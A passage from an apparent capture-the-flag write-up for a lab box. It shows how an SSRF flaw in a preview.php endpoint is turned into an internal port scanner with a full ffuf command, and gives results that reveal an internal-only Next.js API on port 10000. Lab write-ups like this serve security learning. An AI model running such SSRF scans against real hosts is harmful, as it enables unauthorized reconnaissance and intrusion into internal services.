## 3. Internal Port Scan via SSRF

Since `preview.php` will happily fetch `http://127.0.0.1:<port>/`, it can be used as a port scanner by fuzzing the port number and reading response size/status:

```
ffuf -u 'http://10.48.150.125/preview.php?url=http://127.0.0.1:FUZZ/' \
  -w <(seq 1 65535) -mc all -t 100 -fs 0
```

**Results:**

| Port | Size | Service |
|---|---|---|
| 80 | 1735B | The public TryBookMe app (reachable from outside too) |
| 10000 | 6131B | An internal-only Next.js API, not exposed externally |

Port 10000 is the target — it's not reachable directly from outside the box, only through the SSRF.

